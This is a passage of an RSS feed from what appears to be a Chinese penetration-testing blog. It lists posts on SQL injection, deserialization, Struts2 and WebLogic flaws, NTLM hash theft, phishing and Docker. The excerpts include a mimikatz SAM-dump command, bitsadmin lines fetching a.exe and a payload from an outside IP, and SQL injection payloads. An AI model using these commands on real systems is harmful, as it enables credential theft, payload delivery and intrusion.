<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Reber&#39;s Blog</title>
    <link>https://wyb0.com/posts/</link>
    <description>Recent content in Posts on Reber&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 11 Oct 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://wyb0.com/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Kerberos 与 NTLM Hash 与 Ticket</title>
      <link>https://wyb0.com/posts/2022/kerberos-hash-ticket/</link>
      <pubDate>Tue, 11 Oct 2022 00:00:00 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2022/kerberos-hash-ticket/</guid>
      <description>0x00 Kerberos Kerberos 协议有两个基础认证模块: AS 和 TGS，以及微软扩展的两个认证模块 S4U 和 PAC。 常见的基于 Kerberos 协议攻击的方法如下图所示： 0x01</description>
    </item>
    
    <item>
      <title>JNDI 注入</title>
      <link>https://wyb0.com/posts/2022/jndi/</link>
      <pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2022/jndi/</guid>
      <description>0x00 JDNI JNDI(Java Naming and Directory Interface) 是 Java 提供的 Java 命名和目录接口 JNDI 可访问的现有的目录及服务有：JDBC、LDAP、RMI、DNS、NIS、COR</description>
    </item>
    
    <item>
      <title>Gophish 钓鱼测试</title>
      <link>https://wyb0.com/posts/2021/gophish/</link>
      <pubDate>Sun, 26 Sep 2021 11:45:33 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2021/gophish/</guid>
      <description>0x00 Gophish 使用 配置 Gophish 服务 配置发送邮箱 编写钓鱼邮件内容 编写钓鱼页面 添加目标邮箱 开始攻击 0x01 配置 Gophish 服务 在 https://github.com/gophish/gophish/releases 下载 然后编辑 config.</description>
    </item>
    
    <item>
      <title>PHP 反序列化与字符串逃逸</title>
      <link>https://wyb0.com/posts/2021/php-deserialize-and-string-escaping/</link>
      <pubDate>Sun, 18 Jul 2021 17:21:33 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2021/php-deserialize-and-string-escaping/</guid>
      <description>0x00 漏洞成因 该漏洞主要是因为序列化的字符串在经过过滤函数不正确的处理而导致对象注入，目前看到都是因为过滤函数放在了 serialize 函数之</description>
    </item>
    
    <item>
      <title>PHP 反序列化</title>
      <link>https://wyb0.com/posts/2021/php-deserialize/</link>
      <pubDate>Thu, 08 Jul 2021 17:08:50 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2021/php-deserialize/</guid>
      <description>0x01 php 中的魔法函数 __construct()：PHP 中类的构造函数，创建对象时调用。具有构造函数的类会在每次创建新对象时先</description>
    </item>
    
    <item>
      <title>通过 Sphinx 快速查询数据</title>
      <link>https://wyb0.com/posts/2021/sphinx/</link>
      <pubDate>Thu, 10 Jun 2021 16:44:23 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2021/sphinx/</guid>
      <description>0x00 Sphinx Sphinx 是一款基于 SQL 的高性能全文检索引擎，Sphinx 的性能在众多全文检索引擎中也是数一数二的，利用 Sphinx我们可以完</description>
    </item>
    
    <item>
      <title>获取 NTLM Hash</title>
      <link>https://wyb0.com/posts/2020/get-hash/</link>
      <pubDate>Tue, 08 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2020/get-hash/</guid>
      <description>0x01 通过 sam 文件获取 通过 mimikatz 转储 sam 文件得到 hash(cmd 需要管理员权限) mimikatz.exe log &amp;#34;privilege::debug&amp;#34; &amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::sam&amp;#34; exit 通过 reg save 导出 sam 文件(2003 之后可以使用)(导 hiv 文件 cmd</description>
    </item>
    
    <item>
      <title>记一次 SQL 注入简单 bypass</title>
      <link>https://wyb0.com/posts/2020/recording-a-injection-bypass/</link>
      <pubDate>Mon, 22 Jun 2020 17:35:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2020/recording-a-injection-bypass/</guid>
      <description>0x00 存在 SQL 注入 总之是遇到一个站，登录的页面，数据包大致如下： POST /jsweb/userlogin/UserLoginAction.aspx HTTP/1.1 Host: 115.xxx.xxx.xxx:8042 Content-Length: 47 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://115.xxx.xxx.xxx:8042 Referer:</description>
    </item>
    
    <item>
      <title>目录遍历利用</title>
      <link>https://wyb0.com/posts/2019/a-directory-traversal-using-script/</link>
      <pubDate>Mon, 16 Dec 2019 09:23:47 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2019/a-directory-traversal-using-script/</guid>
      <description>0x00 目录遍历 一个同事说有一些目录遍历，想着能不能搞个脚本啥的，以后利用也方便，自己没有写出来，说让我看看 一般来说存在目录遍</description>
    </item>
    
    <item>
      <title>PostgreSQL 简单使用</title>
      <link>https://wyb0.com/posts/2019/postgresql-basis-use/</link>
      <pubDate>Fri, 23 Aug 2019 16:27:12 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2019/postgresql-basis-use/</guid>
      <description>0x00 安装 ➜ brew install postgresql ➜ echo &amp;#39;export PATH=&amp;#34;/usr/local/Cellar/postgresql/11.4/bin:$PATH&amp;#34;&amp;#39; &amp;gt;&amp;gt; ~/.zshrc ➜ source ~/.zshrc -- 初始化数据库 ➜ initdb /usr/local/var/postgres ➜ pg_ctl -D /usr/local/var/postgres -l /usr/local/var/log/postgres.log start 0x01 简单操作 常用操作命令 reber=# \password #设置当前登录用户的密码 reber=# \password</description>
    </item>
    
    <item>
      <title>记一次网页 js 挂马</title>
      <link>https://wyb0.com/posts/2019/recording-a-webpage-hanging-horse/</link>
      <pubDate>Mon, 19 Aug 2019 10:17:46 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2019/recording-a-webpage-hanging-horse/</guid>
      <description>0x00 常见网页挂马方式 iframe 框架挂马 简单来说就是加 iframe 标签 script 挂马 通过各种办法加载 js 代码 htm 文件挂马 上传 htm 文件，然后用 script 引入 js 挂马 上传</description>
    </item>
    
    <item>
      <title>FRP 内网穿透</title>
      <link>https://wyb0.com/posts/2019/frp-intranet-through/</link>
      <pubDate>Tue, 30 Jul 2019 23:27:54 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2019/frp-intranet-through/</guid>
      <description>0x00 对外提供简单的文件访问服务 服务端 ➜ frp cat frps.ini [common] ; 监听端口 bind_port = 7000 ; 那些端口允许客户端用来映射 allow_ports = 22-80,3000,33389 ➜ frp ./frps -c frps.ini 2019/07/31 00:22:31 [I] [service.go:139] frps tcp listen on</description>
    </item>
    
    <item>
      <title>通过 selenium 和 flask 中转后利用 sqlmap 进行注入</title>
      <link>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</link>
      <pubDate>Sat, 27 Jul 2019 18:15:25 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</guid>
      <description>0x00 先说前提 昨天某个小伙伴说有个注入没法搞 前端提交登陆表单时数据包加密了, 而且有个 sign 字符串每次都不一样用于校验, 应该是用 js</description>
    </item>
    
    <item>
      <title>利用 Python 的协程进行快速端口扫描</title>
      <link>https://wyb0.com/posts/2019/python-coroutine-fast-port-scan/</link>
      <pubDate>Thu, 04 Jul 2019 18:09:49 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2019/python-coroutine-fast-port-scan/</guid>
      <description>0x00 协程的优势 协程拥有极高的执行效率，因为子程序切换不是线程切换，而是由程序自身控制，因此没有线程切换的开销。和多线程比，</description>
    </item>
    
    <item>
      <title>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP)</title>
      <link>https://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</link>
      <pubDate>Sat, 29 Jun 2019 17:57:32 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</guid>
      <description>0x00 影响版本 致远A8-V5协同管理软件 V6.1sp1 致远A8+协同管理软件 V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远</description>
    </item>
    
    <item>
      <title>从 SQL Server 注入到 远程连接桌面</title>
      <link>https://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</link>
      <pubDate>Tue, 25 Jun 2019 17:01:53 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</guid>
      <description>0x00 目标情况 只有一个登录框 0x01 发现注入 简单看了下登陆框，可以爆破用户名 加单引号后报错，试了试 and 1=1 确实存在注入 0x01 进一步测试 尝试</description>
    </item>
    
    <item>
      <title>从 SQL Server 注入到 getshell</title>
      <link>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</link>
      <pubDate>Sat, 02 Mar 2019 20:23:35 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</guid>
      <description>0x00 目标情况 一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令 扫描了全端口，没有发现什么有用的</description>
    </item>
    
    <item>
      <title>SQL注入 tips(Oracle)</title>
      <link>https://wyb0.com/posts/2019/injection-tips-of-oracle/</link>
      <pubDate>Fri, 04 Jan 2019 20:23:35 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2019/injection-tips-of-oracle/</guid>
      <description>0x00 判断数据库类型 Oracle有一些自带的表：dual、user_tables id=45 and (select count(*) from user_tables)&amp;gt;0-- id=45 and (select count(*) from dual)&amp;gt;0-- 利用自带的一些函数：</description>
    </item>
    
    <item>
      <title>Oracle 数据库简单使用</title>
      <link>https://wyb0.com/posts/2018/oracle-database/</link>
      <pubDate>Tue, 25 Dec 2018 23:34:56 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/oracle-database/</guid>
      <description>0x00 关于Oracle 完整的Oracle数据库通常由两部分组成：Oracle数据库和数据库实例。 数据库是一系列物理文件的集合</description>
    </item>
    
    <item>
      <title>记一次 SQL Server 报错注入</title>
      <link>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</link>
      <pubDate>Mon, 24 Dec 2018 10:51:02 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</guid>
      <description>0x00 验证码前端验证 需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，</description>
    </item>
    
    <item>
      <title>使用 docker-compose 构造 LAMP 环境</title>
      <link>https://wyb0.com/posts/2018/docker-compose-build-lamp/</link>
      <pubDate>Sat, 15 Dec 2018 22:51:04 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/docker-compose-build-lamp/</guid>
      <description>0x00 实现功能 使用docker-compose构造LAMP环境，其中mysql数据库、mysql配置文件、网站文件均持久化存</description>
    </item>
    
    <item>
      <title>Docker Compose</title>
      <link>https://wyb0.com/posts/2018/docker-compose/</link>
      <pubDate>Mon, 19 Nov 2018 20:10:23 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/docker-compose/</guid>
      <description>0x00 关于docker compose 可以把docker-compose当作docker命令的封装，它是一个用来把 docker 自动化的东西，dock</description>
    </item>
    
    <item>
      <title>内网渗透之 Responder 与 Net-NTLM hash</title>
      <link>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</link>
      <pubDate>Mon, 10 Sep 2018 09:48:10 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</guid>
      <description>0x00 一些概念 Windows 认证协议 分为：基于 NTLM 的认证和基于 kerberos 的认证 什么是 NTLM Hash？ 早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性</description>
    </item>
    
    <item>
      <title>SQL注入 tips(SQL Server)</title>
      <link>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</link>
      <pubDate>Tue, 04 Sep 2018 10:09:17 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</guid>
      <description>0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&amp;lt;01&amp;gt; ORIGINAL_LOGIN(); --sa 0x01 UNION query &amp;amp; error-based 注入 判断存在注入 and 1=1/and 1=2 select * from msg where id=1 and 11=(select case when(1=1) then</description>
    </item>
    
    <item>
      <title>关于 PHP SESSION 反序列化</title>
      <link>https://wyb0.com/posts/2018/php-session-deserialize/</link>
      <pubDate>Mon, 23 Jul 2018 00:09:17 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/php-session-deserialize/</guid>
      <description>0x00 环境 公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。 其中有一道是php反序列化，直接用的就是 第三</description>
    </item>
    
    <item>
      <title>Struts 2 相关漏洞 payload</title>
      <link>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</link>
      <pubDate>Mon, 25 Jun 2018 21:26:14 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</guid>
      <description>0x00 S2-001 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表</description>
    </item>
    
    <item>
      <title>SQL注入 tips(MySQL)</title>
      <link>https://wyb0.com/posts/2018/injection-tips-of-mysql/</link>
      <pubDate>Wed, 23 May 2018 11:14:51 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/injection-tips-of-mysql/</guid>
      <description>环境：MySQL 5.5.47 0x00 注入点在Order by后面 mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by id into outfile &amp;#39;C:\\Apps\\phpStudy\\WWW\\a.txt&amp;#39;; Query OK, 1 row affected (0.01 sec) mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1);</description>
    </item>
    
    <item>
      <title>ThinkPHP5 的 where 函数使用不当存在注入</title>
      <link>https://wyb0.com/posts/2018/thinkphp5-where-function/</link>
      <pubDate>Mon, 16 Apr 2018 19:16:14 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/thinkphp5-where-function/</guid>
      <description>0x00 关于thinkphp5的where函数 年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个</description>
    </item>
    
    <item>
      <title>WebLogic 反序列化漏洞(CVE-2017-10271)</title>
      <link>https://wyb0.com/posts/2018/cve-2017-10271/</link>
      <pubDate>Fri, 09 Mar 2018 09:20:03 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/cve-2017-10271/</guid>
      <description>0x00 WebLogic WLS组件反序列化漏洞 这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列</description>
    </item>
    
    <item>
      <title>Metasploit 简单提权</title>
      <link>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</link>
      <pubDate>Mon, 26 Feb 2018 13:43:20 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</guid>
      <description>0x00 前提 虚拟机有一个shell：http://10.11.11.20/a.php，物理机IP是211.222.222.72</description>
    </item>
    
    <item>
      <title>Windows 终端下载文件和执行远程文件</title>
      <link>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</link>
      <pubDate>Tue, 06 Feb 2018 15:12:32 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</guid>
      <description>环境：Windows Server 2008 R2 Enterprise 0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe 0x01 certutil下载文</description>
    </item>
    
    <item>
      <title>Python 中执行系统命令</title>
      <link>https://wyb0.com/posts/2018/python-run-cmd/</link>
      <pubDate>Mon, 29 Jan 2018 16:45:34 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/python-run-cmd/</guid>
      <description>0x00 使用模块 在python执行系统命令一般可以通过3个模块来实现，这三个模块是：os、commands、subproces</description>
    </item>
    
    <item>
      <title>打包下载 php 文件</title>
      <link>https://wyb0.com/posts/2018/package-and-download-the-php-file/</link>
      <pubDate>Mon, 08 Jan 2018 22:02:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2018/package-and-download-the-php-file/</guid>
      <description>0x00 代码如下 &amp;lt;?php function addFileToZip($zip,$zipname,$path){ $handler = opendir($path); while(($filename = readdir($handler))!==false) { if($filename != &amp;#34;.&amp;#34; &amp;amp;&amp;amp; $filename != &amp;#34;..&amp;#34; &amp;amp;&amp;amp; $filename!= $zipname){ if (is_dir($path.&amp;#34;/&amp;#34;.$filename)) { //如果读取的某个对象是文件夹，则递归 addFileToZip($zip,$zipname,$path.&amp;#34;/&amp;#34;.$filename); } else { $zip-&amp;gt;addFile($path.&amp;#34;/&amp;#34;.$filename); } } } @closedir($path); } function tar($zipname,$path) {</description>
    </item>
    
    <item>
      <title>XXE 漏洞</title>
      <link>https://wyb0.com/posts/2017/xxe/</link>
      <pubDate>Sat, 09 Dec 2017 23:02:22 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/xxe/</guid>
      <description>0x00 XXE XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG</description>
    </item>
    
    <item>
      <title>DNS 域传送漏洞</title>
      <link>https://wyb0.com/posts/2017/dns-zone-transfer/</link>
      <pubDate>Mon, 20 Nov 2017 13:58:33 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/dns-zone-transfer/</guid>
      <description>0x00 DNS域传送 DNS服务器分为：主服务器、备份服务器和缓存服务器，在主备服务器之间则通过“DNS域传送”同步数据。 若DN</description>
    </item>
    
    <item>
      <title>中间件安全配置</title>
      <link>https://wyb0.com/posts/2017/middleware-security-configuration/</link>
      <pubDate>Sat, 28 Oct 2017 13:58:29 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/middleware-security-configuration/</guid>
      <description>0x00 Apache 服务器安全配置 #查看服务器运行权限 $ ps aux|grep apache|grep -v grep $ sudo lsof -i:80 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME apache2 1377 root 4u IPv6 12596 0t0 TCP *:http (LISTEN) apache2 21121 www-data 4u IPv6 12596 0t0 TCP *:http (LISTEN) apache2 21122</description>
    </item>
    
    <item>
      <title>Docker 之数据卷</title>
      <link>https://wyb0.com/posts/2017/docker-volume/</link>
      <pubDate>Tue, 19 Sep 2017 10:35:09 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/docker-volume/</guid>
      <description>0x00 为什么使用数据卷 Docker镜像是由多个文件系统(只读层)叠加而成的。 当一个容器启动时Docker会加载只读镜像层并在</description>
    </item>
    
    <item>
      <title>Docker 之 Dockerfile</title>
      <link>https://wyb0.com/posts/2017/docker-dockerfile/</link>
      <pubDate>Fri, 18 Aug 2017 18:05:43 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/docker-dockerfile/</guid>
      <description>操作系统：macOS Sierra 10.12.6 Docker版本：Docker version 18.09.0, build 4d60db4 0x00 Dockerfile Dockerfile里面其实是一条条的指令，Docke</description>
    </item>
    
    <item>
      <title>Docker 之镜像与容器</title>
      <link>https://wyb0.com/posts/2017/docker-image-and-container/</link>
      <pubDate>Fri, 18 Aug 2017 14:36:39 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/docker-image-and-container/</guid>
      <description>操作系统：Ubuntu14.04.1 Docker版本：Docker version 17.06.0-ce, build 02c1d87 0x00 镜像操作 下载镜像 #一般镜像、容器的id和na</description>
    </item>
    
    <item>
      <title>Docker 初识</title>
      <link>https://wyb0.com/posts/2017/docker-basis/</link>
      <pubDate>Tue, 15 Aug 2017 22:16:35 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/docker-basis/</guid>
      <description>0x00 关于Docker Docker中的镜像类似VM的快照，容器类似虚拟机，使用镜像创建容器类似于使用快照创建虚拟机。 Dock</description>
    </item>
    
    <item>
      <title>[转] HTTPS 加密原理简介</title>
      <link>https://wyb0.com/posts/2017/introduction-to-https-encryption-principles/</link>
      <pubDate>Tue, 01 Aug 2017 18:16:39 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/introduction-to-https-encryption-principles/</guid>
      <description>原文链接：http://www.cnblogs.com/JeffreySun/archive/2010/06/24/16</description>
    </item>
    
    <item>
      <title>使用 Python 读写 xml 文件</title>
      <link>https://wyb0.com/posts/2017/python-read-and-write-xml/</link>
      <pubDate>Thu, 20 Jul 2017 14:20:26 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/python-read-and-write-xml/</guid>
      <description>0x00 解析XML的方法 SAX (simple API for XML) python 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调</description>
    </item>
    
    <item>
      <title>MRQ 的使用</title>
      <link>https://wyb0.com/posts/2017/python-module-mrq/</link>
      <pubDate>Mon, 10 Jul 2017 16:30:43 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/python-module-mrq/</guid>
      <description>0x00 MRQ MRQ是Python基于Redis、Mongo和gevent的分布式任务队列。 MRQ一方面旨在像RQ一样简单，另一方</description>
    </item>
    
    <item>
      <title>AJAX 之跨域</title>
      <link>https://wyb0.com/posts/2017/ajax-cross-domain/</link>
      <pubDate>Thu, 22 Jun 2017 15:18:29 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/ajax-cross-domain/</guid>
      <description>0x00 简介 当使用AJAX请求其他域名下的数据时会出现拒绝访问的情况，这是出于安全考虑，AJAX只能访问本地的资源，而不能跨域</description>
    </item>
    
    <item>
      <title>SSI 注入</title>
      <link>https://wyb0.com/posts/2017/ssi-injection/</link>
      <pubDate>Thu, 08 Jun 2017 11:20:15 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/ssi-injection/</guid>
      <description>0x00 SSI SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内</description>
    </item>
    
    <item>
      <title>SQLServer 存储过程</title>
      <link>https://wyb0.com/posts/2017/sqlserver-stored-procedure/</link>
      <pubDate>Tue, 30 May 2017 13:16:18 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/sqlserver-stored-procedure/</guid>
      <description>0x00 数据表结构 CREATE DATABASE student; CREATE TABLE info ( id INT IDENTITY(1,1) PRIMARY KEY NOT NULL, name VARCHAR(20) NOT NULL DEFAULT &amp;#39;xiaoming&amp;#39;, sex INT NOT NULL DEFAULT 1, age INT NOT NULL DEFAULT 0, hight INT NOT NULL DEFAULT 0 ) INSERT INTO info(name,sex,age,hight) VALUES(&amp;#39;xiaohong&amp;#39;,0,23,165); INSERT INTO info(name,sex,age,hight) VALUES(&amp;#39;xiaogang&amp;#39;,1,24,175); INSERT INTO info(name,sex,age,hight) VALUES(&amp;#39;xiaoliu&amp;#39;,1,21,160); INSERT INTO info(name,sex,age,hight)</description>
    </item>
    
    <item>
      <title>SQLServer 的基本使用</title>
      <link>https://wyb0.com/posts/2017/sqlserver-basis-use/</link>
      <pubDate>Tue, 30 May 2017 12:53:41 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/sqlserver-basis-use/</guid>
      <description>0x00 数据库 -- 创建数据库 CREATE DATABASE student; -- 选择数据库 USE student; -- 查看当前数据库 SELECT DB_NAME(); -- 查看当前数据库 SELECT DB_NAME(); -- 查看数据库版本 SELECT @@version; 0x01 数据表 -- 创建数据</description>
    </item>
    
    <item>
      <title>MongoDB 的基本使用</title>
      <link>https://wyb0.com/posts/2017/mongodb-basis-use/</link>
      <pubDate>Thu, 25 May 2017 15:33:12 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/mongodb-basis-use/</guid>
      <description>0x00 角色和权限 Mongo的授权采用了角色授权的方法，每个用户都有一组权限，Monog内建角色权限如下： 数据库用户角色 rea</description>
    </item>
    
    <item>
      <title>Mac 基础设置</title>
      <link>https://wyb0.com/posts/2017/mac-basic-use/</link>
      <pubDate>Fri, 19 May 2017 16:51:11 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/mac-basic-use/</guid>
      <description>macOS Sierra 10.12.6 0x00 安装brew $ /usr/bin/ruby -e &amp;#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&amp;#34; 0x01 安装wget $ brew install wget 0x02 安装oh-my-zsh $ wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh $ cat /etc/shells #查看当前有什么she</description>
    </item>
    
    <item>
      <title>Struts2-046 EXP</title>
      <link>https://wyb0.com/posts/2017/struts2-046/</link>
      <pubDate>Sun, 16 Apr 2017 17:44:01 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/struts2-046/</guid>
      <description>Struts2 046 前段时间写的struts2 046检测脚本，代码如下： #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber import sys import pycurl import StringIO def initCurl(): c = pycurl.Curl() c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源 c.setopt(pycurl.MAXREDIRS,</description>
    </item>
    
    <item>
      <title>检测 WebLogic 是否存在 SSRF</title>
      <link>https://wyb0.com/posts/2017/weblogic-ssrf-check/</link>
      <pubDate>Fri, 14 Apr 2017 14:43:52 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/weblogic-ssrf-check/</guid>
      <description>0x00 weblogic返回状态 weblogic的ssrf漏洞测试3种状态，返回如下： 同网段不存在的主机 同网段主机存活但端口不</description>
    </item>
    
    <item>
      <title>XSS 中的编码</title>
      <link>https://wyb0.com/posts/2017/xss-encode/</link>
      <pubDate>Thu, 30 Mar 2017 15:25:37 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/xss-encode/</guid>
      <description>0x00 浏览器解析 浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt</description>
    </item>
    
    <item>
      <title>在 vps 上搭建 Shadowsocks</title>
      <link>https://wyb0.com/posts/2017/vps-set-up-shadowsocks/</link>
      <pubDate>Fri, 10 Mar 2017 10:34:40 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/vps-set-up-shadowsocks/</guid>
      <description>0x01 安装与配置 环境：Ubuntu 14.04.1 LTS reber@localhost:~$ sudo apt-get update reber@localhost:~$ python --version Python 2.7.6 reber@localhost:~$ sudo apt-get install python-gevent python-pip reber@localhost:~$ sudo pip install shadowsocks reber@localhost:~$ vim /home/reber/shadowsocks.json { &amp;#34;server&amp;#34;:&amp;#</description>
    </item>
    
    <item>
      <title>利用多参数提高 webshell 爆破速度</title>
      <link>https://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</link>
      <pubDate>Fri, 17 Feb 2017 10:32:24 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</guid>
      <description>0x00 原理 之前在https://www.t00ls.net/viewthread.php?tid=36985看到这个思路的。</description>
    </item>
    
    <item>
      <title>301 重定向</title>
      <link>https://wyb0.com/posts/2017/301-redirect/</link>
      <pubDate>Tue, 07 Feb 2017 10:49:38 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/301-redirect/</guid>
      <description>0x00 目的 由于博客更换了域名，原来百度收录的都成了死链，所以做一下301重定向 我使用的是github搭建的博客，都是html</description>
    </item>
    
    <item>
      <title>Ubuntu 下部署 Gitlab</title>
      <link>https://wyb0.com/posts/2017/ubuntu-set-up-gitlab/</link>
      <pubDate>Mon, 16 Jan 2017 20:18:05 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2017/ubuntu-set-up-gitlab/</guid>
      <description>0x00 前期准备 # 环境 Ubuntu 14.04 reber@ubuntu:~/Desktop$ sudo apt-get install openssh-server reber@ubuntu:~/Desktop$ sudo apt-get install openssh-client reber@ubuntu:~/Desktop$ sudo apt-get install git 0x01 安装 reber@ubuntu:~/Desktop$ wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/pool/trusty/main/g/gitlab-ce/gitlab-ce_8.8.0-ce.0_amd64.deb reber@ubuntu:~/Desktop$ sudo dpkg -i gitlab-ce_8.8.0-ce.0_amd64.deb 0x02 配置 reber@ubuntu:~/Desktop$ sudo vim /etc/gitlab/gitlab.rb external_url &amp;#39;http://192.168.188.160:80&amp;#39; ...... gitlab_rails[&amp;#39;time_zone&amp;#39;] = &amp;#39;Asia/Shanghai&amp;#39; gitlab_rails[&amp;#39;gitlab_email_from&amp;#39;] = &amp;#39;xxxxxx@163.com&amp;#39; ...... gitlab_rails[&amp;#39;smtp_enable&amp;#39;] = true gitlab_rails[&amp;#39;smtp_address&amp;#39;] = &amp;#34;smtp.163.com&amp;#34; gitlab_rails[&amp;#39;smtp_port&amp;#39;]</description>
    </item>
    
    <item>
